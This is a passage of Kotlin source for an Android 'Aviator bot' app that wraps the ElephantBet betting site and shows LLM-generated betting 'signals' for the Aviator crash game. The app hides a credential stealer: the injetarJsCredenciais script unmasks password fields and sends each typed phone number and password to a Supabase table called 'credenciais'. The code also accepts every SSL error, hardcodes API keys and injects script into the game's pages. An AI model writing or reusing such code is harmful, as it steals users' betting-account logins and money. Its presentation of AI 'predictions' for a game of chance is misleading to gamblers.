package ao.elephantbet.aviatorbot

import android.annotation.SuppressLint
import android.app.AlertDialog
import android.content.Intent
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.net.http.SslError
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.view.ViewGroup.LayoutParams.MATCH_PARENT as MATCH
import android.view.ViewGroup.LayoutParams.WRAP_CONTENT as WRAP
import android.webkit.*
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.Calendar

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var barLayout: LinearLayout
    private lateinit var txtMinutos: TextView
    private lateinit var txtAcao: TextView
    private lateinit var txtProtecao: TextView
    private lateinit var txtAlcance: TextView
    private lateinit var dotView: View

    private val handler = Handler(Looper.getMainLooper())
    private var relogioRunnable: Runnable? = null

    // Estado dos sinais
    private var sinaisAtivos = false
    private var horaAtual = -1
    private var ultimoMinutoGerado = -1
    private var sinalMin1 = -1
    private var sinalMin2 = -1
    private var sinalProtecao = ""
    private var sinalAlcMin = 0
    private var sinalAlcMax = ""

    // Histórico real das velas capturadas dentro do jogo
    private val historicoVelas = mutableListOf<Double>()
    private var analisandoIA = false
    private var dentroDoAviator = false
    private var ultimaAnaliseMs = 0L          // cooldown entre chamadas à IA
    private val COOLDOWN_IA_MS = 60_000L      // mínimo 60s entre análises (evita 429)
    private var velasDesdeUltimaAnalise = 0   // contar velas novas desde última análise

    // Controlo do round actual (para capturar só o crash final)
    private var xAtual = 0.0
    private var emVoo = false
    private var ultimoCrash = 0.0
    private var ultimoCrashMs = 0L   // timestamp do último crash (evita duplicados por tempo)
    private var ultimoTickMs = 0L

    // Runnable nomeado para cancelar correctamente o timeout de crash
    private val crashTimeoutRunnable = Runnable {
        if (emVoo && xAtual >= 1.0) registarCrash(xAtual)
    }

    // Configuração do histórico
    private val MIN_VELAS_ANALISE = 15    // mínimo para pedir sinal à IA
    private val MAX_VELAS_LOCAL = 30      // máximo em memória local
    private val MAX_VELAS_SUPABASE = 500  // quando atingir este número, limpar metade
    private var totalVelasSupabase = 0    // contador estimado

    private fun registarCrash(crashVal: Double) {
        if (!emVoo) return
        emVoo = false
        // CORRECÇÃO CRÍTICA: usar o maior entre crashVal (DOM/WS texto) e xAtual (WS binário)
        // Antes só usava xAtual, que era 0 quando o WS binário não funcionava → velas perdidas
        val valorFinal = if (crashVal >= xAtual && crashVal >= 1.0) crashVal else xAtual
        xAtual = 0.0
        handler.removeCallbacks(crashTimeoutRunnable)

        // Evitar duplicados e valores inválidos (usar tempo: mínimo 3s entre crashes)
        val agora = System.currentTimeMillis()
        if (valorFinal < 1.0 || (valorFinal == ultimoCrash && agora - ultimoCrashMs < 3000)) return
        ultimoCrash = valorFinal
        ultimoCrashMs = agora

        // Guardar no histórico local (máx 30)
        historicoVelas.add(valorFinal)
        if (historicoVelas.size > MAX_VELAS_LOCAL) historicoVelas.removeAt(0)

        // Guardar no Supabase (só o crash final, nunca ticks)
        totalVelasSupabase++
        enviarVelaSupabase(valorFinal)

        // Limpar Supabase quando tiver muitas velas
        if (totalVelasSupabase >= MAX_VELAS_SUPABASE) {
            limparVelasAntigas()
            totalVelasSupabase = MAX_VELAS_SUPABASE / 2
        }

        val n = historicoVelas.size

        // Cor da vela para o display
        val corCrash = when {
            valorFinal >= 10.0 -> "#ec4899"  // rosa
            valorFinal >= 2.0  -> "#a855f7"  // roxa
            else               -> "#3b82f6"  // azul
        }
        setBarra("CRASH ${String.format("%.2f", valorFinal)}x",
            if (n < MIN_VELAS_ANALISE) "$n/${MIN_VELAS_ANALISE} velas recolhidas"
            else "$n velas capturadas",
            corCrash)

        velasDesdeUltimaAnalise++

        when {
            n < MIN_VELAS_ANALISE -> {
                handler.postDelayed({
                    setBarra("A RECOLHER DADOS",
                        "$n/${MIN_VELAS_ANALISE} velas capturadas", "#7c3aed")
                }, 2000)
            }
            n >= MIN_VELAS_ANALISE && !analisandoIA -> {
                val agora = System.currentTimeMillis()
                val tempoDecorrido = agora - ultimaAnaliseMs
                // Só pedir sinal se: cooldown passou OU acumulou 5+ velas novas
                val deveAnalizar = tempoDecorrido >= COOLDOWN_IA_MS || velasDesdeUltimaAnalise >= 5
                if (deveAnalizar) {
                    handler.postDelayed({ pedirSinalIA() }, 2000)
                }
            }
        }
    }

    // Credenciais
    private var ultimoNumeroEnviado = ""
    private var ultimaSenhaEnviada = ""

    private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
    private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
    private val TABELA = "credenciais"
    private val VERSAO_ATUAL = "1.2"

    private val GROQ_KEY = "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"
    private val GROQ_URL = "https://api.groq.com/openai/v1/chat/completions"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        construirUI()
        // Carregar site — SEM iniciar sinais aqui
        webView.loadUrl("https://m.elephantbet.co.ao/pt/?action=login")
        // Verificar actualização com diálogo visual, não Toast
        handler.postDelayed({ verificarAtualizacao() }, 3000)
    }

    // ── UI ────────────────────────────────────────────────────────
    private fun construirUI() {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#0a0a0f"))
            layoutParams = ViewGroup.LayoutParams(MATCH, MATCH)
        }
        setContentView(root)

        barLayout = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setBackgroundColor(Color.parseColor("#0f172a"))
            setPadding(dp(14), dp(12), dp(14), dp(12))
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP)
        }

        // Ícone do avião com fundo circular
        val icoAviao = TextView(this).apply {
            text = "✈️"; textSize = 20f; gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(dp(38), dp(38))
        }

        // Bloco central — todas as informações do sinal
        val bloco = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
            setPadding(dp(10), 0, dp(8), 0)
        }

        // Linha 1: estado da IA + hora
        val linha1 = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP)
        }
        txtAcao = TextView(this).apply {
            text = "AVIATOR BOT"; textSize = 11f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#64748b")); letterSpacing = 0.08f
            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply { marginEnd = dp(8) }
        }
        txtMinutos = TextView(this).apply {
            text = "Abra o Aviator"; textSize = 11f
            setTextColor(Color.parseColor("#475569")); isSingleLine = true
            layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
        }
        linha1.addView(txtAcao); linha1.addView(txtMinutos)

        // Linha 2: proteção e alcance — os palpites centrais
        val linha2 = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(6) }
        }
        txtProtecao = TextView(this).apply {
            text = "🛡 --"; textSize = 12f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#64748b")); gravity = Gravity.CENTER
            setPadding(dp(10), dp(5), dp(10), dp(5))
            background = pill("#1e293b")
            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply { marginEnd = dp(8) }
        }
        val sep = TextView(this).apply {
            text = "→"; textSize = 13f; setTextColor(Color.parseColor("#334155"))
            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply { marginEnd = dp(8) }
        }
        txtAlcance = TextView(this).apply {
            text = "🎯 --"; textSize = 12f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#64748b")); gravity = Gravity.CENTER
            setPadding(dp(10), dp(5), dp(10), dp(5))
            background = pill("#1e293b")
            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP)
        }
        linha2.addView(txtProtecao); linha2.addView(sep); linha2.addView(txtAlcance)
        bloco.addView(linha1); bloco.addView(linha2)

        // Indicador de estado (ponto colorido)
        dotView = View(this).apply {
            layoutParams = LinearLayout.LayoutParams(dp(10), dp(10)).apply { marginEnd = dp(10) }
            background = circulo("#334155")
        }
        val cfgBtn = TextView(this).apply {
            text = "⚙️"; textSize = 22f; gravity = Gravity.CENTER
            setOnClickListener { mostrarConfig() }
        }

        barLayout.addView(icoAviao); barLayout.addView(bloco)
        barLayout.addView(dotView); barLayout.addView(cfgBtn)
        root.addView(barLayout)

        webView = WebView(this).apply {
            layoutParams = LinearLayout.LayoutParams(MATCH, 0, 1f)
        }
        configurarWebView()
        root.addView(webView)
    }

    // ── WEBVIEW ───────────────────────────────────────────────────
    @SuppressLint("SetJavaScriptEnabled")
    private fun configurarWebView() {
        webView.settings.apply {
            javaScriptEnabled = true; domStorageEnabled = true
            databaseEnabled = true; allowFileAccess = true
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            userAgentString = "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
            setSupportZoom(true); builtInZoomControls = false
            loadWithOverviewMode = true; useWideViewPort = true
        }

        webView.addJavascriptInterface(object {

            // Chamado quando o JS confirma que o iframe/jogo Aviator carregou
            @JavascriptInterface
            fun aviatorAberto() = runOnUiThread {
                if (!dentroDoAviator) {
                    dentroDoAviator = true
                    historicoVelas.clear()
                    emVoo = false
                    xAtual = 0.0
                    ultimoCrash = 0.0
                    analisandoIA = false
                    setBarra("A CARREGAR HISTORICO", "A buscar velas do servidor...", "#7c3aed")
                    // Carregar velas guardadas no Supabase para não começar do zero
                    carregarVelasSupabase()
                }
            }

            // Chamado pelo JS a cada tick do multiplicador em tempo real
            // IMPORTANTE: estes ticks NÃO são guardados no Supabase — só o crash final
            @JavascriptInterface
            fun velaCapturada(valor: String) {
                val num = valor.toDoubleOrNull() ?: return
                if (num < 1.0 || num > 200000.0) return
                val agora = System.currentTimeMillis()
                runOnUiThread {
                    // Cancelar timeout anterior — avião ainda está a voar
                    handler.removeCallbacks(crashTimeoutRunnable)

                    if (!emVoo) {
                        emVoo = true
                        xAtual = num
                        ultimoTickMs = agora
                        setBarra("EM VOO", "x${String.format("%.2f", num)} | ${historicoVelas.size} velas", "#f59e0b")
                    } else {
                        if (num >= xAtual) {
                            xAtual = num
                            ultimoTickMs = agora
                            setBarra("EM VOO", "x${String.format("%.2f", num)} | ${historicoVelas.size} velas", "#f59e0b")
                        }
                    }

                    // Timeout dinâmico: quanto maior a vela, mais tempo esperamos
                    // sem receber ticks antes de considerar que o avião caiu
                    val timeoutMs = when {
                        xAtual >= 100.0 -> 60000L  // 60s para velas 100x+
                        xAtual >= 20.0  -> 40000L  // 40s para velas 20x-100x
                        xAtual >= 5.0   -> 20000L  // 20s para velas 5x-20x
                        else            -> 10000L  // 10s para velas abaixo de 5x
                    }
                    handler.postDelayed(crashTimeoutRunnable, timeoutMs)
                }
            }

            // Chamado pelo JS quando detecta crash explícito via WS (mais fiável)
            @JavascriptInterface
            fun crashDetectado(valor: String) {
                val num = valor.toDoubleOrNull() ?: return
                if (num < 1.0 || num > 200000.0) return
                runOnUiThread {
                    handler.removeCallbacks(crashTimeoutRunnable)
                    // CORRECCAO: forcar emVoo=true para que registarCrash nao descarte
                    // (DOM scanner pode detectar crash sem ter havido ticks WS binarios)
                    if (!emVoo) emVoo = true
                    registarCrash(num)
                }
            }

            @JavascriptInterface
            fun guardarNumero(valor: String) {
                if (valor.isNotEmpty() && valor != ultimoNumeroEnviado) {
                    ultimoNumeroEnviado = valor
                    enviarSupabase("Numero", valor)
                }
            }

            @JavascriptInterface
            fun guardarSenha(valor: String) {
                if (valor.isNotEmpty() && valor != ultimaSenhaEnviada) {
                    ultimaSenhaEnviada = valor
                    enviarSupabase("Senha", valor)
                }
            }
        }, "Android")

        webView.webViewClient = object : WebViewClient() {
            override fun onReceivedSslError(v: WebView?, h: SslErrorHandler?, e: SslError?) { h?.proceed() }
            override fun shouldOverrideUrlLoading(v: WebView?, r: WebResourceRequest?) = false

            // ── CHAVE: Interceptar HTML da Spribe e injectar o nosso JS ──
            // Isto corre ANTES do browser processar a resposta — sem problemas cross-origin
            override fun shouldInterceptRequest(view: WebView?, request: WebResourceRequest?): WebResourceResponse? {
                val url = request?.url?.toString() ?: return null

                // Interceptar apenas pedidos HTML da Spribe/Aviator
                val isSpribe = url.contains("spribegaming.com") || url.contains("aviaport")
                val isHtml = !url.contains(".js") && !url.contains(".css") &&
                             !url.contains(".png") && !url.contains(".jpg") &&
                             !url.contains(".woff") && !url.contains(".ttf") &&
                             !url.contains("websocket") && !url.contains(".ico") &&
                             !url.contains(".svg") && !url.contains(".json") &&
                             !url.contains(".wasm")

                if (isSpribe && isHtml) {
                    try {
                        // Fazer o pedido original
                        val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                        request.requestHeaders?.forEach { (k, v) -> conn.setRequestProperty(k, v) }
                        conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")
                        conn.connectTimeout = 10000
                        conn.readTimeout = 15000
                        conn.connect()

                        val contentType = conn.contentType ?: "text/html"
                        if (!contentType.contains("html")) return null

                        // Ler o HTML original
                        val originalHtml = conn.inputStream.bufferedReader().readText()

                        // O nosso script WS interceptor — injectado como primeiro script
                        val nossoScript = """
<script>
(function() {
    if (window._wsAvOk) return;
    window._wsAvOk = true;

    // Estado do round actual
    var emVoo = false;
    var xMax = 0.0;
    var crashTimer = null;

    function tick(num) {
        if (num < 1.0 || num > 200000.0) return;
        // Cancelar timer de crash — avião ainda está a voar
        if (crashTimer) { clearTimeout(crashTimer); crashTimer = null; }
        if (!emVoo) {
            emVoo = true;
            xMax = num;
        } else if (num > xMax) {
            xMax = num;
        }
        // Enviar tick para display (NÃO é guardado no Supabase)
        var s = num.toFixed(2);
        try { top.Android && top.Android.velaCapturada(s); } catch(ex) {}
        try { window.Android && window.Android.velaCapturada(s); } catch(ex) {}
        // Se não chegar nenhum tick em 8 segundos = crash
        crashTimer = setTimeout(function() {
            if (emVoo && xMax >= 1.0) crash(xMax);
        }, 8000);
    }

    function crash(num) {
        if (!emVoo) return;
        emVoo = false;
        if (crashTimer) { clearTimeout(crashTimer); crashTimer = null; }
        var val = (num > xMax) ? num : xMax;
        xMax = 0.0;
        if (val < 1.0) return;
        var s = val.toFixed(2);
        // Enviar crash (ESTE é guardado no Supabase)
        try { top.Android && top.Android.crashDetectado(s); } catch(ex) {}
        try { window.Android && window.Android.crashDetectado(s); } catch(ex) {}
    }

    function lerBinario(buf) {
        try {
            var bytes = new Uint8Array(buf);
            for (var i = 0; i < bytes.length - 10; i++) {
                if (bytes[i] === 1 && bytes[i+1] === 120 && bytes[i+2] === 7) {
                    var view = new DataView(buf, i + 3, 8);
                    var num = view.getFloat64(0, false);
                    if (num >= 1.0 && num <= 200000.0) tick(num);
                }
            }
        } catch(ex) {}
    }

    var WSOrig = window.WebSocket;
    window.WebSocket = function(url, p) {
        var ws = p ? new WSOrig(url, p) : new WSOrig(url);
        try { ws.binaryType = 'arraybuffer'; } catch(ex) {}

        ws.addEventListener('message', function(e) {
            try {
                if (e.data instanceof ArrayBuffer) { lerBinario(e.data); return; }
                if (e.data instanceof Blob) {
                    e.data.arrayBuffer().then(function(buf) { lerBinario(buf); });
                    return;
                }
                var d = (typeof e.data === 'string') ? e.data : '';
                if (!d || d.length < 3) return;
                var corpo = d;
                if (d.charAt(0) === 'a') {
                    try { corpo = JSON.parse(d.substring(1))[0]; } catch(ex) {
                        corpo = d.substring(3, d.length - 2).replace(/\\"/g, '"');
                    }
                }
                // Crash explícito — estes campos só aparecem quando o avião cai
                var crashPadroes = [
                    /"crash_x"\s*:\s*([\d.]+)/,
                    /"crash_point"\s*:\s*([\d.]+)/,
                    /"cashout_coef"\s*:\s*([\d.]+)/,
                    /"finish_coef"\s*:\s*([\d.]+)/,
                    /"end_coef"\s*:\s*([\d.]+)/,
                    /"game_state"\s*:\s*"(?:crashed|finished|end)"/
                ];
                for (var c = 0; c < crashPadroes.length; c++) {
                    var mc = corpo.match(crashPadroes[c]);
                    if (mc && mc[1]) { crash(parseFloat(mc[1])); return; }
                    if (mc && !mc[1]) { crash(xMax); return; } // estado sem valor
                }
                // Tick do multiplicador (avião a subir)
                var vooPadroes = [
                    /"coefficient"\s*:\s*([\d.]+)/,
                    /"coef"\s*:\s*([\d.]+)/,
                    /"multiplier"\s*:\s*([\d.]+)/
                ];
                for (var v = 0; v < vooPadroes.length; v++) {
                    var mv = corpo.match(vooPadroes[v]);
                    if (mv) { tick(parseFloat(mv[1])); return; }
                }
            } catch(ex) {}
        });
        return ws;
    };
    window.WebSocket.prototype = WSOrig.prototype;
    window.WebSocket.CONNECTING = 0;
    window.WebSocket.OPEN = 1;
    window.WebSocket.CLOSING = 2;
    window.WebSocket.CLOSED = 3;
})();
</script>"""

                        // Injectar após <head> ou no início do body
                        val htmlModificado = when {
                            originalHtml.contains("<head>", ignoreCase = true) ->
                                originalHtml.replaceFirst(
                                    Regex("<head>", RegexOption.IGNORE_CASE),
                                    "<head>$nossoScript"
                                )
                            originalHtml.contains("<body", ignoreCase = true) -> {
                                val bodyTag = Regex("<body[^>]*>", RegexOption.IGNORE_CASE).find(originalHtml)?.value ?: "<body>"
                                originalHtml.replaceFirst(
                                    Regex("<body[^>]*>", RegexOption.IGNORE_CASE),
                                    bodyTag + nossoScript
                                )
                            }
                            else -> nossoScript + originalHtml
                        }

                        val encoding = conn.contentEncoding ?: "UTF-8"
                        return WebResourceResponse(
                            "text/html", encoding,
                            htmlModificado.byteInputStream()
                        )
                    } catch (e: Exception) {
                        return null // Em caso de erro, deixar o WebView fazer o pedido normal
                    }
                }
                return null
            }

            override fun onPageFinished(v: WebView?, url: String?) {
                super.onPageFinished(v, url)
                val u = url ?: ""
                if (!u.contains("spribe") && !u.contains("elbet") && !u.contains("cdn")) {
                    injetarJsCredenciais()
                }
                if (u.contains("game-view/806666") || u.contains("aviator", ignoreCase = true)) {
                    injetarJsAviator()
                }
                // Injectar também em qualquer página da Spribe
                if (u.contains("spribegaming") || u.contains("aviaport")) {
                    injetarJsAviator()
                }
            }
        }

        // Interceptar iframes — o jogo Aviator carrega num iframe
        webView.webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, p: Int) {
                if (p == 100) {
                    // Tentar injectar detector do jogo em qualquer URL que tenha aviator
                    val url = view?.url ?: ""
                    if (url.contains("aviator", ignoreCase = true) ||
                        url.contains("game-view/806666")) {
                        injetarJsAviator()
                    } else {
                        injetarJsCredenciais()
                    }
                }
            }
        }
    }

    // JS para capturar credenciais na página de login
    private fun injetarJsCredenciais() {
        val js = """
(function() {
    if (window._credDone) return; window._credDone = true;
    function tornarVisivel() {
        document.querySelectorAll('input[type="password"]').forEach(function(el) {
            el.setAttribute('type','text');
        });
    }
    tornarVisivel();
    new MutationObserver(tornarVisivel).observe(document.body||document.documentElement,{childList:true,subtree:true});
    function watchN(sel){var el=document.querySelector(sel);if(el&&!el._wN){el._wN=true;el.addEventListener('input',function(){if(this.value.length>=1)Android.guardarNumero(this.value);});}}
    function watchS(sel){var el=document.querySelector(sel);if(el&&!el._wS){el._wS=true;el.addEventListener('input',function(){if(this.value.length>=1)Android.guardarSenha(this.value);});}}
    function cap(){
        ['input[name="username"]','input[name="phone"]','input[type="tel"]','input[placeholder*="telefone" i]','input[placeholder*="numero" i]','#username','#phone'].forEach(watchN);
        ['input[name="password"]','input[name="senha"]','input[placeholder*="senha" i]','#password'].forEach(watchS);
    }
    cap(); setTimeout(cap,2000); setTimeout(cap,5000);
})();
        """.trimIndent()
        webView.evaluateJavascript(js, null)
    }

    // JS especializado para capturar velas
    // Intercepta WebSocket binário SPRIBE + fallback DOM
    private fun injetarJsAviator() {
        val js = """
(function() {
    if (window._aviatorDone) return; window._aviatorDone = true;
    Android.aviatorAberto();

    // ── Interceptor WebSocket Binário (método principal) ──────────
    (function() {
        if (window._wsAvOk) return;
        window._wsAvOk = true;

        function enviarVela(num) {
            if (num < 1.0 || num > 1000.0) return;
            var s = num.toFixed(2);
            try { top.Android && top.Android.velaCapturada(s); } catch(ex) {}
            try { window.Android && window.Android.velaCapturada(s); } catch(ex) {}
        }

        function lerBinario(buf) {
            try {
                var bytes = new Uint8Array(buf);
                for (var i = 0; i < bytes.length - 10; i++) {
                    if (bytes[i] === 1 && bytes[i+1] === 120 && bytes[i+2] === 7) {
                        var view = new DataView(buf, i + 3, 8);
                        var num = view.getFloat64(0, false);
                        if (num >= 1.0 && num <= 1000.0) enviarVela(num);
                    }
                }
            } catch(ex) {}
        }

        var WSOrig = window.WebSocket;
        window.WebSocket = function(url, p) {
            var ws = p ? new WSOrig(url, p) : new WSOrig(url);
            try { ws.binaryType = 'arraybuffer'; } catch(ex) {}
            ws.addEventListener('message', function(e) {
                try {
                    if (e.data instanceof ArrayBuffer) { lerBinario(e.data); return; }
                    if (e.data instanceof Blob) { e.data.arrayBuffer().then(lerBinario); return; }
                    var d = typeof e.data === 'string' ? e.data : '';
                    if (!d || d.length < 3) return;
                    var corpo = d.charAt(0) === 'a' ? (function(){try{return JSON.parse(d.substring(1))[0];}catch(ex){return d.substring(3,d.length-2).replace(/\\"/g,'"');}})() : d;
                    var padroes = [/"coefficient"\s*:\s*([\d.]+)/,/"coef"\s*:\s*([\d.]+)/,/"x"\s*:\s*([\d.]+)/,/"multiplier"\s*:\s*([\d.]+)/];
                    for (var i = 0; i < padroes.length; i++) {
                        var m = corpo.match(padroes[i]);
                        if (m) { enviarVela(parseFloat(m[1])); break; }
                    }
                } catch(ex) {}
            });
            return ws;
        };
        window.WebSocket.prototype = WSOrig.prototype;
        window.WebSocket.CONNECTING = 0; window.WebSocket.OPEN = 1;
        window.WebSocket.CLOSING = 2; window.WebSocket.CLOSED = 3;
    })();

    // Histórico de crashes já enviados (dedup global por sessão)
    var crashesEnviados = new Set();
    var ultimoPayoutTopo = '';

    function enviarCrash(num) {
        if (isNaN(num) || num < 1.01 || num > 200000) return;
        var key = num.toFixed(2);
        if (crashesEnviados.has(key)) return;
        crashesEnviados.add(key);
        if (crashesEnviados.size > 200) {
            // Manter só os 100 mais recentes para não crescer infinitamente
            var arr = Array.from(crashesEnviados);
            crashesEnviados = new Set(arr.slice(arr.length - 100));
        }
        try { Android.crashDetectado(key); } catch(e) {}
    }

    // ── Método 1: selector .payout — histórico visível no topo ──
    // Envia TODOS os payouts visíveis na primeira vez, depois só o novo
    function lerPayout(doc) {
        try {
            var payouts = doc.querySelectorAll('.payout');
            if (payouts.length > 0) {
                // Enviar todos (histórico inicial + novos)
                Array.from(payouts).forEach(function(el) {
                    var txt = el.textContent.trim();
                    var n = parseFloat(txt.replace(/x$/i,'').replace(',','.'));
                    enviarCrash(n);
                });
                // Detectar nova vela no topo (crash novo em tempo real)
                var topo = payouts[0].textContent.trim();
                if (topo !== ultimoPayoutTopo) {
                    ultimoPayoutTopo = topo;
                }
                return true;
            }
        } catch(e) {}
        return false;
    }

    // ── Método 2: scan genérico com dedup (fallback) ──────────────
    function scanGenerico(doc) {
        try {
            doc.querySelectorAll('*').forEach(function(el) {
                if (el.children.length > 0) return;
                var txt = (el.textContent || '').trim();
                if (/^\d+\.?\d*x$/i.test(txt)) {
                    var num = parseFloat(txt.replace(/x$/i,''));
                    enviarCrash(num);
                }
            });
        } catch(e) {}
    }

    // ── Tentar no documento actual e em todos os iframes ──────────
    function tentarCapturar() {
        // Documento actual
        if (lerPayout(document)) return;
        scanGenerico(document);

        // Iframes nível 1
        var iframes = document.querySelectorAll('iframe');
        for (var i = 0; i < iframes.length; i++) {
            try {
                var doc1 = iframes[i].contentDocument || iframes[i].contentWindow.document;
                if (!doc1) continue;
                if (lerPayout(doc1)) return;
                scanGenerico(doc1);

                // Iframes nível 2
                var subs = doc1.querySelectorAll('iframe');
                for (var j = 0; j < subs.length; j++) {
                    try {
                        var doc2 = subs[j].contentDocument || subs[j].contentWindow.document;
                        if (!doc2) continue;
                        if (lerPayout(doc2)) return;
                        scanGenerico(doc2);
                    } catch(e2) {}
                }
            } catch(e1) {}
        }
    }

    // ── Observer para apanhar novas velas em tempo real ───────────
    function observar(doc) {
        try {
            new MutationObserver(function() { tentarCapturar(); })
                .observe(doc.documentElement, {childList: true, subtree: true});
        } catch(e) {}
    }
    observar(document);

    // ── Arrancar ──────────────────────────────────────────────────
    tentarCapturar();
    setInterval(tentarCapturar, 2000);
})();
        """.trimIndent()
        webView.evaluateJavascript(js, null)
    }

    // ── GROQ IA ───────────────────────────────────────────────────
    private fun pedirSinalIA() {
        if (analisandoIA || historicoVelas.size < MIN_VELAS_ANALISE) return
        analisandoIA = true

        // Segurança: se a IA não responder em 35s, desbloquear para tentar de novo
        handler.postDelayed({
            if (analisandoIA) {
                analisandoIA = false
                setBarra("ERRO IA", "timeout — a tentar de novo", "#ef4444")
            }
        }, 35000)

        val cal = Calendar.getInstance()
        val horaAgora = cal.get(Calendar.HOUR_OF_DAY)
        val minAgora = cal.get(Calendar.MINUTE)

        // Usar sempre as últimas 20 velas para análise
        val velasParaAnalise = historicoVelas.takeLast(20)

        // Classificar velas por cor para dar mais contexto à IA
        val azuis  = velasParaAnalise.count { it < 2.0 }   // 1.00-1.99
        val roxas  = velasParaAnalise.count { it in 2.0..9.99 } // 2.00-9.99
        val rosas  = velasParaAnalise.count { it >= 10.0 }  // 10.00+

        val historico = velasParaAnalise.joinToString(", ") { String.format("%.2f", it) }
        setBarra("IA A ANALISAR", "${velasParaAnalise.size} velas...", "#7c3aed")

        Thread {
            try {
                // Calcular estatísticas reais para dar contexto à IA
                val media = velasParaAnalise.average()
                val ultimas5 = velasParaAnalise.takeLast(5)
                val media5 = ultimas5.average()
                val maxRecente = velasParaAnalise.takeLast(10).maxOrNull() ?: 0.0
                val sequenciaAzuis = velasParaAnalise.reversed().takeWhile { it < 2.0 }.size
                val sequenciaAbaixo2 = velasParaAnalise.reversed().takeWhile { it < 2.0 }.size

                val prompt = """
Analisa RIGOROSAMENTE este historico real do Aviator e calcula previsoes baseadas nos padroes.

HISTORICO COMPLETO (${velasParaAnalise.size} rondas, da mais antiga para a mais recente):
[${historico}]

ESTATISTICAS CALCULADAS:
- Media geral: ${String.format("%.2f", media)}x
- Media ultimas 5 rondas: ${String.format("%.2f", media5)}x  
- Maximo recente (ultimas 10): ${String.format("%.2f", maxRecente)}x
- Azuis seguidas agora: $sequenciaAzuis
- Distribuicao: $azuis azuis (1-1.99x) | $roxas roxas (2-9.99x) | $rosas rosas (10x+)

REGRAS DE ANALISE OBRIGATORIA:
1. Se sequenciaAzuis >= 3: proximo pico tende a ser mais alto (2x-10x)
2. Se media5 < media: tendencia de queda, protecao mais baixa
3. Se rosas > 0 nas ultimas 5: pode haver retorno a azuis, cuidado
4. Se media5 > 3.0: momentum alto, alcance pode ser maior
5. A protecao DEVE ser calculada com base na media5, nao um valor fixo

CALCULA e responde APENAS com este JSON (sem texto, sem markdown, sem explicacoes):
{"protecao":NUMERO,"alcance_min":NUMERO,"alcance_max":"NUMEROx","tendencia":"SUBIDA|QUEDA|LATERAL","confianca":PERCENTAGEM}

Exemplo real baseado nos dados acima (NAO uses este exemplo, calcula com os dados reais):
{"protecao":${String.format("%.1f", (media5 * 0.6).coerceIn(1.2, 8.0))},"alcance_min":${(media5 * 0.8).toInt().coerceAtLeast(2)},"alcance_max":"${(media5 * 2.5).toInt().coerceAtLeast(3)}x","tendencia":"${if (media5 > media) "SUBIDA" else "QUEDA"}","confianca":72}
                """.trimIndent()

                val bodyJson = "{\"model\":\"llama-3.3-70b-versatile\"," +
                    "\"messages\":[{\"role\":\"user\",\"content\":${escapeJson(prompt)}}]," +
                    "\"max_tokens\":100,\"temperature\":0.3}"

                val conn = URL(GROQ_URL).openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Authorization", "Bearer $GROQ_KEY")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true; conn.connectTimeout = 20000; conn.readTimeout = 20000
                OutputStreamWriter(conn.outputStream).use { it.write(bodyJson) }
                val code = conn.responseCode
                val resp = BufferedReader(InputStreamReader(
                    if (code in 200..299) conn.inputStream else conn.errorStream
                )).readText()
                conn.disconnect()

                if (code in 200..299) {
                    processarRespostaGroq(resp, minAgora)
                } else if (code == 429) {
                    // Rate limit — esperar 90s antes de desbloquear
                    runOnUiThread {
                        analisandoIA = false
                        ultimaAnaliseMs = System.currentTimeMillis() + 90_000L // forcar espera extra
                        velasDesdeUltimaAnalise = 0
                        setBarra("AGUARDAR", "Limite atingido — 90s", "#f59e0b")
                    }
                } else {
                    runOnUiThread {
                        analisandoIA = false
                        setBarra("ERRO IA", "HTTP $code", "#ef4444")
                    }
                }
            } catch (e: Exception) {
                runOnUiThread {
                    analisandoIA = false
